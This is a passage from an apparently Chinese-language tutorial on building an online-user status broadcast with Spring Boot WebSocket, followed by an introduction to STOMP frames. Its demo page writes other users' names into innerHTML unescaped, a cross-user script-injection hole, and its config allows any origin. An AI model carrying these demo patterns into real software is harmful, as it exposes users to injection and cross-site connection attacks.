<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OnlineStatusHandler</span> <span class="keyword">extends</span> <span class="title class_">TextWebSocketHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 ConcurrentHashMap 存储在线用户的 session，key 是 username</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;String, WebSocketSession&gt; userSessions = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>(); <span class="comment">// 用于序列化 JSON</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionEstablished</span><span class="params">(WebSocketSession session)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getAttributes().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        userSessions.put(username, session);</span><br><span class="line">        System.out.println(<span class="string">&quot;用户 &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; 连接成功. 当前在线人数: &quot;</span> + userSessions.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 广播状态更新</span></span><br><span class="line">        broadcastStatusUpdate(<span class="string">&quot;USER_JOIN&quot;</span>, username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterConnectionClosed</span><span class="params">(WebSocketSession session, CloseStatus status)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> (String) session.getAttributes().get(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        userSessions.remove(username);</span><br><span class="line">        System.out.println(<span class="string">&quot;用户 &#x27;&quot;</span> + username + <span class="string">&quot;&#x27; 断开连接. 当前在线人数: &quot;</span> + userSessions.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 广播状态更新</span></span><br><span class="line">        broadcastStatusUpdate(<span class="string">&quot;USER_LEAVE&quot;</span>, username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 广播用户状态更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> type &quot;USER_JOIN&quot; 或 &quot;USER_LEAVE&quot;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 发生状态改变的用户名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">broadcastStatusUpdate</span><span class="params">(String type, String username)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 构建消息体</span></span><br><span class="line">        Map&lt;String, Object&gt; messagePayload = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        messagePayload.put(<span class="string">&quot;type&quot;</span>, type);</span><br><span class="line">        messagePayload.put(<span class="string">&quot;username&quot;</span>, username);</span><br><span class="line">        messagePayload.put(<span class="string">&quot;onlineUsers&quot;</span>, userSessions.keySet()); <span class="comment">// 发送当前所有在线用户的列表</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TextMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TextMessage</span>(objectMapper.writeValueAsString(messagePayload));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 向所有在线用户广播</span></span><br><span class="line">        <span class="keyword">for</span> (WebSocketSession session : userSessions.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (session.isOpen()) &#123;</span><br><span class="line">                session.sendMessage(message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 辅助方法，用于拦截器检查用户是否已在线</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isUserOnline</span><span class="params">(String username)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> userSessions.containsKey(username);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在这个示例中，我们不处理客户端发来的消息，但保留该方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">handleTextMessage</span><span class="params">(WebSocketSession session, TextMessage message)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 可以用于实现心跳等功能</span></span><br><span class="line">        System.out.println(<span class="string">&quot;收到来自 &quot;</span> + session.getAttributes().get(<span class="string">&quot;username&quot;</span>) + <span class="string">&quot; 的消息: &quot;</span> + message.getPayload());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Pro Tip</strong>: 在更大型的应用中，<code>userSessions</code> 这个 Map 最好放在一个单独的 <code>@Service</code> Bean 中，然后注入到 Handler 和 Interceptor 里，而不是使用 <code>static</code> 变量。这更符合 Spring 的依赖注入思想。</p>
<hr>
<h3 id="4-4-配置-WebSocket-WebSocketConfig"><a href="#4-4-配置-WebSocket-WebSocketConfig" class="headerlink" title="4.4 配置 WebSocket (WebSocketConfig)"></a>4.4 配置 WebSocket (<code>WebSocketConfig</code>)</h3><p>将我们创建的 Handler 和 Interceptor 注册到 Spring WebSocket 中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocket</span> <span class="comment">// 开启 WebSocket 支持</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> OnlineStatusHandler onlineStatusHandler;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserStatusHandshakeInterceptor userStatusHandshakeInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerWebSocketHandlers</span><span class="params">(WebSocketHandlerRegistry registry)</span> &#123;</span><br><span class="line">        registry.addHandler(onlineStatusHandler, <span class="string">&quot;/status&quot;</span>) <span class="comment">// 注册处理器到 &quot;/status&quot; 路径</span></span><br><span class="line">                .addInterceptors(userStatusHandshakeInterceptor) <span class="comment">// 添加握手拦截器</span></span><br><span class="line">                .setAllowedOrigins(<span class="string">&quot;*&quot;</span>); <span class="comment">// 允许跨域访问</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-5-创建前端测试页面-index-html"><a href="#4-5-创建前端测试页面-index-html" class="headerlink" title="4.5 创建前端测试页面 (index.html)"></a>4.5 创建前端测试页面 (<code>index.html</code>)</h3><p>创建一个简单的 HTML 文件来测试我们的服务。你可以将它放在 <code>src/main/resources/static/index.html</code>。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WebSocket Online Status Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123; <span class="attribute">font-family</span>: sans-serif; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#controls</span>, <span class="selector-id">#status</span>, <span class="selector-id">#users</span> &#123; <span class="attribute">margin-bottom</span>: <span class="number">20px</span>; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#user-list</span> &#123; <span class="attribute">list-style-type</span>: none; <span class="attribute">padding</span>: <span class="number">0</span>; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#user-list</span> <span class="selector-tag">li</span> &#123; <span class="attribute">background</span>: <span class="number">#f0f0f0</span>; <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>; <span class="attribute">padding</span>: <span class="number">8px</span>; <span class="attribute">border-radius</span>: <span class="number">4px</span>; &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#log</span> &#123; <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>; <span class="attribute">padding</span>: <span class="number">10px</span>; <span class="attribute">height</span>: <span class="number">200px</span>; <span class="attribute">overflow-y</span>: scroll; <span class="attribute">background</span>: <span class="number">#fafafa</span>; &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>在线用户状态广播服务<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;controls&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username-input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入你的用户名&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;connect()&quot;</span>&gt;</span>连接<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;disconnect()&quot;</span> <span class="attr">disabled</span>&gt;</span>断开<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;users&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>在线用户 (<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;user-count&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">span</span>&gt;</span>)<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;user-list&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;status&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>系统日志<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;log&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> websocket = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> usernameInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username-input&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> connectBtn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button[onclick=&quot;connect()&quot;]&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> disconnectBtn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button[onclick=&quot;disconnect()&quot;]&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> logDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;log&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> userList = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;user-list&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> userCount = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;user-count&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">message</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            logDiv.<span class="property">innerHTML</span> += <span class="string">`&lt;p&gt;<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toLocaleTimeString()&#125;</span>: <span class="subst">$&#123;message&#125;</span>&lt;/p&gt;`</span>;</span></span><br><span class="line"><span class="language-javascript">            logDiv.<span class="property">scrollTop</span> = logDiv.<span class="property">scrollHeight</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> username = usernameInput.<span class="property">value</span>.<span class="title function_">trim</span>();</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (!username) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(<span class="string">&#x27;请输入用户名!&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> url = <span class="string">`ws://localhost:8080/status?username=<span class="subst">$&#123;username&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">            websocket = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(url);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onopen</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">log</span>(<span class="string">`与服务器连接成功！`</span>);</span></span><br><span class="line"><span class="language-javascript">                usernameInput.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                connectBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">                disconnectBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onmessage</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> data = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">log</span>(<span class="string">`收到消息: <span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(data)&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">&#x27;USER_JOIN&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">log</span>(<span class="string">`[系统] 用户 &quot;<span class="subst">$&#123;data.username&#125;</span>&quot; 加入了聊天室。`</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.<span class="property">type</span> === <span class="string">&#x27;USER_LEAVE&#x27;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">log</span>(<span class="string">`[系统] 用户 &quot;<span class="subst">$&#123;data.username&#125;</span>&quot; 离开了聊天室。`</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// 更新在线用户列表</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">updateUserList</span>(data.<span class="property">onlineUsers</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onclose</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">log</span>(<span class="string">`连接已关闭。原因: <span class="subst">$&#123;event.reason || <span class="string">&#x27;未知&#x27;</span>&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">resetUI</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            websocket.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">log</span>(<span class="string">`发生错误: <span class="subst">$&#123;event.message || <span class="string">&#x27;连接失败&#x27;</span>&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">resetUI</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">disconnect</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (websocket) &#123;</span></span><br><span class="line"><span class="language-javascript">                websocket.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">updateUserList</span>(<span class="params">users</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            userList.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            users.<span class="title function_">forEach</span>(<span class="function"><span class="params">user</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                li.<span class="property">textContent</span> = user;</span></span><br><span class="line"><span class="language-javascript">                userList.<span class="title function_">appendChild</span>(li);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            userCount.<span class="property">textContent</span> = users.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">resetUI</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            usernameInput.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            connectBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            disconnectBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            websocket = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">            userList.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            userCount.<span class="property">textContent</span> = <span class="string">&#x27;0&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="4-6-运行和测试"><a href="#4-6-运行和测试" class="headerlink" title="4.6 运行和测试"></a>4.6 运行和测试</h3><ol>
<li>启动你的 Spring Boot 应用程序。</li>
<li>在浏览器中打开 <code>http://localhost:8080/index.html</code>。</li>
<li><strong>打开多个浏览器标签页或窗口</strong>，都访问该地址。</li>
<li>在第一个标签页，输入用户名 “Alice”，点击“连接”。你会看到日志显示连接成功，在线用户列表显示 “Alice”。</li>
<li>在第二个标签页，输入用户名 “Bob”，点击“连接”。<ul>
<li>“Bob” 的窗口会显示连接成功，在线用户列表为 [“Alice”, “Bob”]。</li>
<li>“Alice” 的窗口会收到一条广播消息，日志显示 “用户 Bob 加入了聊天室”，同时其在线用户列表也会更新为 [“Alice”, “Bob”]。</li>
</ul>
</li>
<li>尝试在第三个标签页使用已在线的用户名（如 “Alice”）连接，连接会失败（检查浏览器开发者工具的 Console 和 Network 面板，会看到 WebSocket 握手失败，HTTP 状态码为 409 Conflict）。</li>
<li>关闭 “Alice” 的浏览器标签页或点击“断开”。<ul>
<li>“Bob” 的窗口会收到一条广播消息，日志显示 “用户 Alice 离开了聊天室”，其在线用户列表更新为只有 “Bob”。</li>
</ul>
</li>
</ol>
<hr>
<h1 id="五、Spring-Boot-STOMP"><a href="#五、Spring-Boot-STOMP" class="headerlink" title="五、Spring Boot + STOMP"></a>五、Spring Boot + STOMP</h1><h2 id="1-为什么需要-STOMP？"><a href="#1-为什么需要-STOMP？" class="headerlink" title="1. 为什么需要 STOMP？"></a>1. 为什么需要 STOMP？</h2><p>原生 WebSocket (JSR-356) 协议本身非常强大，它提供了一个全双工、低延迟的持久化连接通道。然而，它也仅仅是一个<strong>传输层协议</strong>，就像 TCP 一样。它只规定了如何建立连接和如何传输“一帧一帧”的数据（文本或二进制），但<strong>并未规定这些数据内容的具体格式和含义</strong>。</p>
<p>这就好比我们建好了一条双向高速公路（WebSocket 连接），但是路上没有任何交通规则、路牌或导航系统。每辆车（消息）都需要自己决定开往哪里，并且到达目的地后，接收方还需要自己解析这辆车里装的是什么。</p>
<p>在实际应用开发中，只使用原生 WebSocket 会遇到以下几个核心痛点：</p>
<h3 id="1-1-缺乏结构化的消息语义"><a href="#1-1-缺乏结构化的消息语义" class="headerlink" title="1.1 缺乏结构化的消息语义"></a>1.1 缺乏结构化的消息语义</h3><ul>
<li><p><strong>原生 WebSocket 的困境</strong>：服务器收到一个字符串消息，比如 <code>&quot;{&quot;user&quot;:&quot;Alice&quot;, &quot;message&quot;:&quot;Hello Bob&quot;}&quot;</code>。这个消息是什么意图？是发送给特定用户的私聊消息？还是广播到聊天室的公共消息？服务器必须解析 JSON 内容，然后根据自定义的字段（如 <code>type</code>, <code>action</code>, <code>toUser</code> 等）来编写大量的 <code>if-else</code> 或 <code>switch-case</code> 逻辑来分发消息。</p>
</li>
<li><p><strong>STOMP 的解决方案</strong>：STOMP (Simple Text Oriented Messaging Protocol) 是一种<strong>应用层协议</strong>，它定义了一套标准化的消息格式和命令。客户端不再是简单地 <code>send(&quot;some string&quot;)</code>，而是发送一个带有明确“意图”的<strong>命令帧 (Command Frame)</strong>。</p>
<p>例如，客户端想订阅一个主题：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE</span><br><span class="line">id:sub-1</span><br><span class="line">destination:/topic/chatRoom-A</span><br><span class="line"></span><br><span class="line">^@</span><br></pre></td></tr></table></figure>

<p>客户端想发送一条消息到某个目的地：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SEND</span><br><span class="line">destination:/app/chat</span><br><span class="line">content-type:application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;from&quot;:&quot;Alice&quot;, &quot;text&quot;:&quot;Hello!&quot;&#125;</span><br><span class="line">^@</span><br></pre></td></tr></table></figure>

